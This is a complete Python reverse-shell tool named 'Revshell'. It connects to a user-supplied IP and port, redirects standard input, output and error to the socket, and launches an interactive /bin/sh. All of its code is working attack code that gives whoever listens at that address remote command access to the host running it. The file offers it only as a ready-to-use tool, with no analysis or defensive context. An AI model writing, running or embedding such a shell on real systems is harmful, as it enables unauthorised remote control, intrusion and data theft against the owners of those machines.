from socket import socket, AF_INET, SOCK_STREAM
from os import dup2
from subprocess import call
from getopt import getopt, GetoptError
from sys import argv


def version():

    print("+-----------------------------------------------------------------------------------+")
    print("| Revshell. Copyright (C) 2020 BrainDisassembly, Contact: braindisassm@gmail.com     |")
    print("| Version: 1.0.0                                                                    |")
    print("|                                                                                   |")
    print("| This program comes with ABSOLUTELY NO WARRANTY; for details type `show w`.        |")
    print("| This is free software, and you are welcome to redistribute it                     |")
    print("| under certain conditions; type `show c` for details.                              |")
    print("+-----------------------------------------------------------------------------------+")


def usage():

    print("Revshell 1.0.0 [Reverse Python Shell]")
    print("Written by: BrainDisassembly <braindisassm@gmail.com>\n")

    print("Usage: {0} --ip 192.168.1.0 --port 8080".format(argv[0]))

    print("\nOptions:")
    print("  -h: --help                           Print usage and exit.")
    print("  -V: --version                        Print version information and exit.")
    print("  -i: --ip                             IP to connect.")
    print("  -p: --port                           Port to connect.")


def revshell():

    s = socket(AF_INET, SOCK_STREAM)
    s.connect((ip, port))
    dup2(s.fileno(), 0)
    dup2(s.fileno(), 1)
    dup2(s.fileno(), 2)
    p = call(["/bin/sh", "-i"])


def main():

    global ip
    ip = ""

    global port
    port = ""

    try:
        opts, args = getopt(argv[1:], "hVi:p:", ["help", "version", "ip=","port="])

    except GetoptError: usage()

    else:
        try:
            for opt, arg in opts:
                if opt in ("-h", "--help"): usage(); exit(1)
                if opt in ("-V", "--version"): version(); exit(1)
                if opt in ("-i", "--ip"): ip = arg
                if opt in ("-p", "--port"): port = int(arg)

            if ip and port: revshell()

            else:
                usage()

        except (UnboundLocalError):
            pass

        except (TypeError):
            pass

if __name__ == "__main__":
        main()
